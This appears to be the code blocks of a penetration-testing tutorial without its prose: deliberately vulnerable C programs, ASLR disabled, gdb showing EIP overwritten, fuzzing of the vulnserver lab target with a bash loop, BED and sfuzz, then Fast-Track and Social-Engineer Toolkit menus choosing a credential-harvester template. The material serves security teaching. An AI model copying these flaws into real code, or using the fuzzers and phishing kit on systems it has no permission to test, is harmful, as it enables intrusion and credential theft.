["```\n# apt-get install gdb\n\n```", "```\n# nano bovrflow.c\n\n```", "```\n/* This program contains an intentional vulnerability for learning purposes. */\n#include <stdio.h>\n#include <string.h>\nint main()\n{\nchar lstring[10];\n/* ask for the user to enter a long string */\nprintf(\"Enter a long string:\");\n/* scanf is known to be susceptible to buffer overflow when %s conversion is used*/\nscanf(\"%s\", lstring);\n/*Print out the string that was typed*/\nprintf(\"You entered: %s\\n\",lstring);\nreturn 0;\n}\n\n```", "```\n# gcc -o bovrflow -fno-stack-protector bovrflow.c\n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb786e000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7701000)\n/lib/ld-linux.so.2 (0xb786f000)\n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb780a000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb769d000)\n/lib/ld-linux.so.2 (0xb780b000)\n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb78b5000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7748000)\n/lib/ld-linux.so.2 (0xb78b6000)\n\n```", "```\n# echo 0 > /proc/sys/kernel/randomize_va_space \n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb7fe4000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e77000)\n/lib/ld-linux.so.2 (0xb7fe5000)\n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb7fe4000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e77000)\n/lib/ld-linux.so.2 (0xb7fe5000)\n\n```", "```\n# root@bt:~ # ldd bovrflow \n\n```", "```\nlinux-gate.so.1 => (0xb7fe4000)\nlibc.so.6 => /lib/tls/i686/cmov/libc.so.6 (0xb7e77000)\n/lib/ld-linux.so.2 (0xb7fe5000)\n\n```", "```\n# ./bovrflow \n\n```", "```\nEnter a long string:\n\n```", "```\nEnter a long string:AAAAAAAAAAAAAAAAAAAAA\nYou entered: AAAAAAAAAAAAAAAAAAAAA\n\n```", "```\nroot@bt:~/overflow# ./bovrflow \n\n```", "```\nEnter a long string:AAAAAAAAAAAAAAAAAAAAAA\nYou entered: AAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault \n\n```", "```\n# gdb bovrflow \n\n```", "```\nGNU gdb (GDB) 7.1-ubuntu\nCopyright (C) 2010 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i486-linux-gnu\".\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>...\nReading symbols from /root/overload/bovrflow...(no debugging symbols found)...done.\n(gdb)\n\n```", "```\n(gdb) r \n\n```", "```\nStarting program: /root/bovrflow\nEnter a long string:AAAAAA\nYou entered: AAAAAA\nProgram exited normally.\n(gdb)\n\n```", "```\n(gdb) r \n\n```", "```\nStarting program: /root/bovrflow\nEnter a long string:AAAAAAAAAAAAAAAAAAAAAA\nYou entered: AAAAAAAAAAAAAAAAAAAAAA\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7e8bb00 in __libc_start_main () from /lib/tls/i686/cmov/libc.so.6\n\n```", "```\n(gdb) i r \n\n```", "```\neax 0x0 0\necx 0xbffff4f8 -1073744648\nedx 0xb7fcc360 -1208171680\nebx 0xb7fcaff4 -1208176652\nesp 0xbffff540 0xbffff540\nebp 0x41414141 0x41414141\nesi 0x0 0\nedi 0x0 0\neip 0xb7e8bb00 0xb7e8bb00 <__libc_start_main+16>\neflags 0x10292 [ AF SF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n\n```", "```\n(gdb) r \n\n```", "```\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\n```", "```\nStarting program: /root/overload/bovrflow\nEnter a long string:AAAAAAAAAAAAAAAAAAAAAAAA\n\n```", "```\nYou entered: AAAAAAAAAAAAAAAAAAAAAAAA\nProgram received signal SIGSEGV, Segmentation fault.\n0xb7004141 in ?? ()\n\n```", "```\n(gdb) info registers \n\n```", "```\neax 0x0 0\necx 0xbffff4f8 -1073744648\nedx 0xb7fcc360 -1208171680\nebx 0xb7fcaff4 -1208176652\nesp 0xbffff540 0xbffff540\nebp 0x41414141 0x41414141\nesi 0x0 0\nedi 0x0 0\neip 0xb7004141 0xb7004141\neflags 0x10292 [ AF SF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n\n```", "```\n(gdb) r \n\n```", "```\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /root/overload/bovrflow\n\n```", "```\nEnter a long string:AAAAAAAAAAAAAAAAAAAAAAAAAA \n\n```", "```\nYou entered: AAAAAAAAAAAAAAAAAAAAAAAAAA\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n\n```", "```\n(gdb) i r \n\n```", "```\neax 0x0 0\necx 0xbffff4f8 -1073744648\nedx 0xb7fcc360 -1208171680\nebx 0xb7fcaff4 -1208176652\nesp 0xbffff540 0xbffff540\nebp 0x41414141 0x41414141\nesi 0x0 0\nedi 0x0 0\neip 0x41414141 0x41414141\neflags 0x10292 [ AF SF IF RF ]\ncs 0x73 115\nss 0x7b 123\nds 0x7b 123\nes 0x7b 123\nfs 0x0 0\ngs 0x33 51\n\n```", "```\n# nano fuzzme.c \n#include <stdio.h>\n#include <string.h>\nint main(int argc, char** argv)\n{\nbdcode(argv[1]);\nreturn 0;\n}\nint bdcode(char *bdinput)\n{\nchar stuff[200];\nstrcpy(stuff, bdinput);\nprintf(\"You passed the following data to fuzzme: %s\\n\",stuff);\nreturn 0;\n}\n\n```", "```\n# gcc -o fuzzme -fno-stack-protector fuzzme.c \n\n```", "```\n# ./fuzzme AAAAAAAAAA \n\n```", "```\nYou passed the following data to fuzzme: AAAAAAAAAA\n\n```", "```\nroot@bt:~# ./fuzzme AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \n\n```", "```\nYou passed the following data to fuzzme: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nSegmentation fault\n\n```", "```\n# nano myfuzzr.sh \n\n```", "```\n# !/bin/bash\nCOUNTER=1\nFUZZY=A\nFUZZIER=A\necho \"How many A's would you like to try?\"\nread COUNTER\nwhile [ $COUNTER -ge 1 ]; do\nlet COUNTER=COUNTER-1\nFUZZY=\"$FUZZY$FUZZIER\"\necho `./fuzzme $FUZZY`\ndone\n\n```", "```\n# ./myfuzzr.sh \n\n```", "```\nHow many A's would you like to try?\n\n```", "```\n10\n\n```", "```\nYou passed the following data to fuzzme: AA\nYou passed the following data to fuzzme: AAA\nYou passed the following data to fuzzme: AAAA\nYou passed the following data to fuzzme: AAAAA\nYou passed the following data to fuzzme: AAAAAA\nYou passed the following data to fuzzme: AAAAAAA\nYou passed the following data to fuzzme: AAAAAAAA\nYou passed the following data to fuzzme: AAAAAAAAA\nYou passed the following data to fuzzme: AAAAAAAAAA\n\n```", "```\n# wine vulnserver.exe 4444 \n\n```", "```\nStarting vulnserver version 1.00\nCalled essential function dll version 1.00\nThis is vulnerable software!\nDo not allow access from untrusted systems or networks!\nWaiting for client connections...\n\n```", "```\n# nc 127.0.0.1 4444 \n\n```", "```\nWelcome to Vulnerable Server! Enter HELP for help.\n\n```", "```\nHELP \n\n```", "```\nValid Commands:\nHELP\nSTATS [stat_value]\nRTIME [rtime_value]\nLTIME [ltime_value]\nSRUN [srun_value]\nTRUN [trun_value]\nGMON [gmon_value]\nGDOG [gdog_value]\nKSTET [kstet_value]\nGTER [gter_value]\nHTER [hter_value]\nLTER [lter_value]\nKSTAN [lstan_value]\nEXIT\n\n```", "```\nLTER AAAAAA \n\n```", "```\nLTER COMPLETE\n\n```", "```\n/pentest/fuzzers/bed# ./bed.pl \n\n```", "```\nBED 0.5 by mjm ( www.codito.de ) & eric ( www.snake-basket.de )\nUsage:\n./bed.pl -s <plugin> -t <target> -p <port> -o <timeout> [ depends on the plugin ]\n<plugin> = FTP/SMTP/POP/HTTP/IRC/IMAP/PJL/LPD/FINGER/SOCKS4/SOCKS5\n<target> = Host to check (default: localhost)\n<port> = Port to connect to (default: standard port)\n<timeout> = seconds to wait after each test (default: 2 seconds)\nuse \"./bed.pl -s <plugin>\" to obtain the parameters you need for the plugin.\nOnly -s is a mandatory switch.\n\n```", "```\npackage bedmod::vserver;\nuse Socket;\nsub new{\nmy $this = {};\n# define everything you might need\nbless $this;\nreturn $this;\n}\nsub init{\nmy $this = shift;\n%special_cfg=@_;\n$this->{proto} = \"tcp\";\nif ($special_cfg{'p'} eq \"\") { $this->{port}='4444'; }\nelse { $this->{port} = $special_cfg{'p'}; }\n$iaddr = inet_aton($this->{target}) || die \"Unknown host: $host\\n\";\n$paddr = sockaddr_in($this->{port}, $iaddr) || die \"getprotobyname: $!\\n\";\n$proto = getprotobyname('tcp') || die \"getprotobyname: $!\\n\";\nsocket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die \"socket: $!\\n\";\nconnect(SOCKET, $paddr) || die \"connection attempt failed: $!\\n\";\nsend(SOCKET, \"HELP\", 0) || die \"HELP request failed: $!\\n\";\n$this->{vrfy} = \"HELP\\r\\n\";\n}\nsub getQuit{\nreturn(\"EXIT\\r\\n\");\n}\n# what to test without doing a login before\nsub getLoginarray{\nmy $this = shift;\n@login = (\"\");\nreturn(@login);\n}\n# which commands does this protocol know ?\nsub getCommandarray {\nmy $this = shift;\n# the XAXAX will be replaced with the buffer overflow / format string data\n# place every command in this array you want to test\n@cmdArray = (\n\"XAXAX\\r\\n\",\n\"STATS XAXAX\\r\\n\",\n\"RTIME XAXAX\\r\\n\",\n\"LTIME XAXAX\\r\\n\",\n\"SRUN XAXAX\\r\\n\",\n\"TRUN XAXAX\\r\\n\",\n\"GMON XAXAX\\r\\n\",\n\"GDOG XAXAX\\r\\n\",\n\"KSTET XAXAX\\r\\n\",\n\"GTER XAXAX\\r\\n\",\n\"HTER XAXAX\\r\\n\",\n\"LTER XAXAX\\r\\n\",\n\"KSTAN XAXAX\\r\\n\"\n);\nreturn(@cmdArray);\n}\n# How to respond to login prompt:\nsub getLogin{ # login procedure\nmy $this = shift;\n@login = (\"HELP\\r\\n\");\nreturn(@login);\n}\n# Test anything else you would like to\nsub testMisc{\nreturn();\n}\n1;\n\n```", "```\n@plugins = ( \"ftp\", \"smtp\", \"pop\", \"http\", \"irc\", \"imap\", \"pjl\", \"lpd\", \"finger\", \"socks4\", \"socks5\", \"vserver\" );\n\n```", "```\n# ./bed.pl -s vserver -t 127.0.0.1 \n\n```", "```\nBED 0.5 by mjm ( www.codito.de ) & eric ( www.snake-basket.de )\n* Normal tests\n+ Buffer overflow testing:\ntesting: 1 XAXAX ...........\ntesting: 2 STATS XAXAX ...........\ntesting: 3 RTIME XAXAX ...........\ntesting: 4 LTIME XAXAX ...........\ntesting: 5 SRUN XAXAX ...........\ntesting: 6 TRUN XAXAX ...........\ntesting: 7 GMON XAXAX ...........\ntesting: 8 GDOG XAXAX ...........\ntesting: 9 KSTET XAXAX ...\n\n```", "```\nWaiting for client connections...\nUnhandled exception: page fault on read access to 0x41414141 in 32-bit code (0x41414141).\nRegister dump:\nCS:0073 SS:007b DS:007b ES:007b FS:0033 GS:003b\nEIP:41414141 ESP:00c0e4c0 EBP:41414141 EFLAGS:00210202( R- -- I - - - ) \nEAX:00c0e470 EBX:7bc9cff4 ECX:00000000 EDX:00000065\nESI:7ffccf10 EDI:00401848\nStack dump:\n0x00c0e4c0: 41414141 41414141 41414141 41414141\n0x00c0e4d0: 41414141 00000000 00000000 00000000\n0x00c0e4e0: 00000000 00000000 00000000 00000000\n0x00c0e4f0: 00000000 00000000 00000000 00000000\n0x00c0e500: 00000000 00000000 00000000 0018ff48\n0x00c0e510: 696c6156 6f432064 6e616d6d 0a3a7364\nBacktrace:\n0x41414141: -- no code accessible --\nModules:\nModule Address Debug info Name (22 modules)\nPE 400000- 407000 Deferred vulnserver\nPE 62500000-62508000 Deferred essfunc\nELF 7b800000-7b97d000 Deferred kernel32<elf>\n\\-PE 7b810000-7b97d000 \\ kernel32\nELF 7bc00000-7bcb9000 Deferred ntdll<elf>\n\\-PE 7bc10000-7bcb9000 \\ ntdll\nELF 7bf00000-7bf04000 Deferred <wine-loader>\nELF 7ed60000-7ed7f000 Deferred libgcc_s.so.1\nELF 7ed90000-7edbd000 Deferred ws2_32<elf>\n\\-PE 7eda0000-7edbd000 \\ ws2_32\nELF 7edbd000-7ee3f000 Deferred msvcrt<elf>\n\\-PE 7edd0000-7ee3f000 \\ msvcrt\nELF 7ef9c000-7efa8000 Deferred libnss_files.so.2\nELF 7efa8000-7efb2000 Deferred libnss_nis.so.2\nELF 7efb2000-7efc9000 Deferred libnsl.so.1\nELF 7efc9000-7efef000 Deferred libm.so.6\nELF 7eff8000-7f000000 Deferred libnss_compat.so.2\nELF b7593000-b7597000 Deferred libdl.so.2\nELF b7597000-b76f1000 Deferred libc.so.6\nELF b76f2000-b770b000 Deferred libpthread.so.0\nELF b771c000-b785c000 Deferred libwine.so.1\nELF b785e000-b787b000 Deferred ld-linux.so.2\nThreads:\nprocess tid prio (all id:s are in hex)\n0000000e services.exe\n00000014 0\n00000010 0\n0000000f 0\n00000011 winedevice.exe\n00000018 0\n00000017 0\n00000013 0\n00000012 0\n00000074 (D) Z:\\root\\vulnserver.exe\n0000004d 0\n00000048 0 <==\n00000076 0\n00000075 0\n0000004b explorer.exe\n0000004c 0\nBacktrace:\nSend failed with error: 10054\nReceived a client connection from 127.0.0.1:41190\nWaiting for client connections...\n\n```", "```\n# wireshark \n\n```", "```\nReceived a client connection from 127.0.0.1:41041 \nWaiting for client connections...\nwine: Unhandled page fault on read access to 0x41414141 at address 0x41414141 (thread 0048), starting debugger...\n\n```", "```\nKSTET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n```", "```\nEXIT\nKSTET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nHELP\nEXIT\nKSTET SUCCESSFUL\n\n```", "```\n# nc 127.0.0.1 4444 \n\n```", "```\nWelcome to Vulnerable Server! Enter HELP for help.\n\n```", "```\nKSTET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \n\n```", "```\nKSTET SUCCESSFUL\n\n```", "```\nKSTET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \n\n```", "```\n/pentest/fuzzers/sfuzz# ./sfuzz \n\n```", "```\n[23:11:45] error: must specify an output type.\nSimple Fuzzer\nBy: Aaron Conole\nversion: 0.6.4\nurl: http://aconole.brad-x.com/programs/sfuzz.html\nEMAIL: apconole@yahoo.com\nBuild-prefix: /usr/local\n-h This message.\n-V Version information.\nnetworking / output:\n-v Verbose output\n-q Silent output mode (generally for CLI fuzzing)\n-X prints the output in hex\n-b Begin fuzzing at the test specified.\n-e End testing on failure.\n-t Wait time for reading the socket\n-S Remote host\n-p Port\n-T|-U|-O TCP|UDP|Output mode\n-R Refrain from closing connections (ie: \"leak\" them)\n-f Config File\n-L Log file\n-n Create a new logfile after each fuzz\n-r Trim the tailing newline\n-D Define a symbol and value (X=y).\n-l Only perform literal fuzzing\n-s Only perform sequence fuzzing\n\n```", "```\ninclude basic-fuzz-strings.list\nreqwait=800\nmaxseqlen=2010\nendcfg\nKSTET FUZZ\n--\nFUZZ\n--\nLHLO FUZZ\n--\n\n```", "```\n# ./sfuzz -e -S 127.0.0.1 -p 4444 -TO -f /sfuzz-sample/basic.vserver \n\n```", "```\n==============================================================\n[23:58:30] attempting fuzz - 31.\nnn[23:58:30] info: tx fuzz - (2017 bytes) - scanning for reply.\n[23:58:31] read:\nWelcome to Vulnerable Server! Enter HELP for help.\n\n```", "```\n# ./fast-track.py -g \n\n```", "```\n----------------------------------------------------------------\nFast-Track - A new beginning...\nAutomated Penetration Testing\nWritten by David Kennedy (ReL1K)\nPlease read the README and LICENSE before using\nthis tool for acceptable use and modifications.\n-------------------------------------------------------------\nModes:\nInteractive Menu Driven Mode: -i\nCommand Line Mode: -c\nWeb GUI Mode -g\nExamples: ./fast-track.py -i\n./fast-track.py -c\n./fast-track.py -g\n./fast-track.py -g <portnum>\nUsage: ./fast-track.py <mode>\n***********************************************\n******* Performing dependency checks... *******\n***********************************************\n*** FreeTDS and PYMMSQL are installed. (Check) ***\n*** PExpect is installed. (Check) ***\n*** ClientForm is installed. (Check) ***\n*** Psyco is installed. (Check) ***\n*** Beautiful Soup is installed. (Check) ***\nAlso ensure ProFTP, WinEXE, and SQLite3 is installed from\nthe Updates/Installation menu.\nYour system has all requirements needed to run Fast-Track!\n****************************************\nFast-Track Web GUI Front-End\nWritten by: David Kennedy (ReL1K)\n****************************************\nStarting HTTP Server on 127.0.0.1 port 44444\n*** Open a browser and go to http://127.0.0.1:44444 ***\nType <control>-c to exit..\n\n```", "```\n# ./fast-track.py -i \n\n```", "```\n***********************************************\n******* Performing dependency checks... *******\n***********************************************\n*** FreeTDS and PYMMSQL are installed. (Check) ***\n*** PExpect is installed. (Check) ***\n*** ClientForm is installed. (Check) ***\n*** Psyco is installed. (Check) ***\n*** Beautiful Soup is installed. (Check) ***\nAlso ensure ProFTP, WinEXE, and SQLite3 is installed from\nthe Updates/Installation menu.\nYour system has all requirements needed to run Fast-Track!\n[---] [---]\n[---] Fast Track: A new beginning [---]\n[---] Written by: David Kennedy (ReL1K) [---]\n[---] Lead Developer: Joey Furr (j0fer) [---]\n[---] Version: 4.0.1 [---]\n[---] Homepage: http://www.secmaniac.com [---]\n[---] [---]\nFast-Track Main Menu:\n1\\. Fast-Track Updates\n2\\. Autopwn Automation\n3\\. Nmap Scripting Engine\n4\\. Microsoft SQL Tools\n5\\. Mass Client-Side Attack\n6\\. Exploits\n7\\. Binary to Hex Payload Converter\n8\\. Payload Generator\n9\\. Fast-Track Tutorials\n10\\. Fast-Track Changelog\n11\\. Fast-Track Credits\n12\\. Exit Fast-Track\nEnter the number:\n\n```", "```\nEnter the number: 1 \n\n```", "```\nFast-Track Update Menu:\n1\\. Update Fast-Track\n2\\. Metasploit 3 Update\n3\\. Update Exploit-DB Exploits\n4\\. Update Gerix Wifi Cracker NG\n5\\. Update Social-Engineer Toolkt\n(q)uit\nEnter number:\n\n```", "```\nEnter the IP Address to listen on: 192.168.1.205 \n\n```", "```\n/pentest/exploits/set# ./set \n\n```", "```\nSelect from the menu:\n1) Spear-Phishing Attack Vectors\n2) Website Attack Vectors\n3) Infectious Media Generator\n4) Create a Payload and Listener\n5) Mass Mailer Attack\n6) Arduino-Based Attack Vector\n7) SMS Spoofing Attack Vector\n8) Wireless Access Point Attack Vector\n9) Third Party Modules\n99) Return back to the main menu.\n\n```", "```\n1) Java Applet Attack Method \n2) Metasploit Browser Exploit Method\n3) Credential Harvester Attack Method\n4) Tabnabbing Attack Method\n5) Man Left in the Middle Attack Method\n6) Web Jacking Attack Method\n7) Multi-Attack Web Method\n8) Victim Web Profiler\n9) Create or import a CodeSigning Certificate\n99) Return to Main Menu\n\n```", "```\n[TRUNCATED\u2026]\n1) Web Templates\n2) Site Cloner\n3) Custom Import\n99) Return to Webattack Menu\nset:webattack>1 \n\n```", "```\n1\\. Java Required\n2\\. Gmail\n3\\. Google\n4\\. Facebook\n5\\. Twitter\n\n```", "```\nset:webattack> Select a template:1 \n\n```"]